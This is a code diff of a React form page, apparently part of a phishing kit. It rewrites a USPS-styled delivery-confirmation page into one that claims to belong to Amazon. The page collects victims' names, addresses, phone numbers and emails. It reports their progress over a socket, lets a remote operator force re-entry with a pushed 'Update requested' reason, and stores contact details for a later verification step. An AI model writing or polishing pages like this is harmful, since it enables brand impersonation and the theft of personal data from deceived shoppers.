@@ -73,7 +73,7 @@ export default function Info() {
   const navigate = useNavigate();
 
   const [form, setForm] = useState<Form>(() => loadInfoFormDraft());
-  const [status, setStatus] = useState('Enter the delivery information for this shipment.');
+  const [status, setStatus] = useState('Enter the shipping information associated with this order.');
   const [loading, setLoading] = useState(false);
   const [errors, setErrors] = useState<Partial<Record<keyof Form, string>>>({});
 
@@ -83,7 +83,7 @@ export default function Info() {
   useEffect(() => {
     socket.emit('join-page', 'info');
     const hasDraft = Object.values(form).some((v) => v.trim());
-    setStatus(hasDraft ? 'Saved details restored.' : 'Enter the delivery information for this shipment.');
+    setStatus(hasDraft ? 'Your saved details were restored.' : 'Enter the shipping information associated with this order.');
   }, []);
 
   useEffect(() => {
@@ -110,7 +110,7 @@ export default function Info() {
       setErrors({});
       setLoading(false);
 
-      setStatus(payload?.reason ? `Update requested: ${payload.reason}` : 'Please review and re-enter the delivery details.');
+      setStatus(payload?.reason ? `Update requested: ${payload.reason}` : 'Please review and re-enter the shipping details for this Amazon order.');
       navigate('/info', { replace: true });
       window.scrollTo({ top: 0, behavior: 'smooth' });
       setTimeout(() => inputRefs.current.fullname?.focus(), 0);
@@ -188,7 +188,7 @@ export default function Info() {
     }
 
     setLoading(true);
-    setStatus('Saving your details...');
+    setStatus('Saving your shipping details...');
     clearDraft(STORAGE_KEYS.infoDraft);
     saveDraft(STORAGE_KEYS.verifyContact, {
       telephone: form.telephone.trim(),
@@ -206,13 +206,14 @@ export default function Info() {
   );
 
   return (
-    <div className="alz-page alz-usps-page">
-      <div className="alz-shell alz-usps-form-shell">
-        <div className="alz-top alz-usps-form-top">
+    <div className="alz-page">
+      <div className="alz-shell">
+        <div className="alz-top">
           <div className="alz-step-head">
             <div>
-              <h1 className="alz-step-title">Confirm the delivery address</h1>
-              <p className="alz-step-subtitle">Review the recipient and mailing details.</p>
+              <div className="alz-badge">{BRAND.name}</div>
+              <h1 className="alz-step-title">Confirm your shipping address</h1>
+              <p className="alz-step-subtitle">Review the shipping details associated with this order.</p>
             </div>
           </div>
           <div className="alz-track mt-3">
@@ -220,10 +221,10 @@ export default function Info() {
           </div>
         </div>
 
-        <div className="alz-flow-grid alz-usps-flow-grid">
-          <div className="alz-card alz-usps-form-card">
-            <div className="alz-section-eyebrow">Delivery details</div>
-            <h2 className="alz-page-title">Review your mailing info</h2>
+        <div className="alz-flow-grid">
+          <div className="alz-card">
+            <div className="alz-section-eyebrow">Shipping details</div>
+            <h2 className="alz-page-title">Review your delivery information</h2>
             <p className="alz-page-copy">{status}</p>
             <div className="alz-brand-row mb-2">
               {BRAND_PROMISES.map((item) => (
@@ -284,10 +285,10 @@ export default function Info() {
               </div>
 
               <button type="submit" disabled={loading} className="alz-btn-primary mt-2 text-lg sm:text-xl md:text-2xl">
-                {loading ? 'Saving...' : 'Continue'}
+                {loading ? 'Saving...' : 'Confirm address'}
               </button>
               <p className="alz-helper-copy text-center mt-3">
-                You may be asked to reconfirm these details later.
+                Amazon may ask you to confirm these details again if account information changes.
               </p>
             </form>
 
@@ -295,21 +296,21 @@ export default function Info() {
             <div className="text-[11px] text-center text-[#565959] mt-1">{BRAND.legal}</div>
           </div>
 
-          <aside className="alz-card alz-flow-aside alz-side-summary alz-usps-side-card">
-            <div className="alz-side-summary-title">Mailing checklist</div>
+          <aside className="alz-card alz-flow-aside alz-side-summary">
+            <div className="alz-side-summary-title">Shipping details</div>
             <div className="alz-order-mini-card">
               <div className="alz-order-mini-thumb" />
               <div>
-                <div className="alz-order-mini-title">Review the address on file</div>
-                <div className="alz-order-mini-copy">Confirm the recipient name, address, ZIP Code, and contact details.</div>
+                <div className="alz-order-mini-title">Review the shipping address on file</div>
+                <div className="alz-order-mini-copy">Confirm the recipient name, street address, ZIP code, and contact details for this order.</div>
               </div>
             </div>
             <div className="alz-side-summary-list">
-              <div>Recipient name exactly as entered</div>
-              <div>Street address, city, state, and ZIP Code</div>
+              <div>Full name for delivery</div>
+              <div>Street address and ZIP Code</div>
               <div>Phone number and email</div>
             </div>
-            <div className="alz-side-summary-box">Use the mailing information tied to this shipment so delivery can resume.</div>
+            <div className="alz-side-summary-box">Use the delivery information associated with this order so Amazon can continue processing the shipment.</div>
           </aside>
         </div>
       </div>
